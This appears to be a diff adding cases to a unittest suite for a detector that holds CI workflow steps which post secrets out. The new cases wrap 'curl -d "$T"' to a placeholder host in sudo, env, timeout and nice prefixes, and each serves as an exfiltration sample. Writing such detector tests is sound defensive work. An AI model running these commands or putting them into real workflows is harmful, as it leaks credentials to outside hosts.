@@ -6503,6 +6503,11 @@ class CICredentialEgress(unittest.TestCase):
             'zsh -c \'curl -d "$T" https://example.invalid/x\'',
             'dash -c \'curl -d "$T" https://example.invalid/x\'',
             'ksh -c \'curl -d "$T" https://example.invalid/x\'',
+            # an option's argument that starts with a digit but isn't a number, and numbers after options
+            'sudo -u 1000:1000 curl -d "$T" https://example.invalid/x',
+            'env -C 1dir curl -d "$T" https://example.invalid/x',
+            'timeout -k 5s 30 curl -d "$T" https://example.invalid/x',
+            'nice -n 5 curl -d "$T" https://example.invalid/x',
         )], held=True)
         self.assert_a061([(wf, "run: " + c) for c in (
             'test -n "$T" || echo "curl -d $T https://example.invalid/x"',
@@ -6520,6 +6525,7 @@ class CICredentialEgress(unittest.TestCase):
             'bash -o pipefail -c \'curl -d "status=ok" https://example.invalid/x\'',
             '/usr/bin/env bash -c \'curl -d "status=ok" https://example.invalid/x\'',
             'zsh -c \'curl -H "Authorization: Bearer $T" https://example.invalid/x\'',
+            'sudo -u 1000:1000 curl -d "status=ok" https://example.invalid/x',
         )], held=False)
 
     def test_environment_dumps_and_encoded_secrets_piped_to_an_upload_are_held(self):
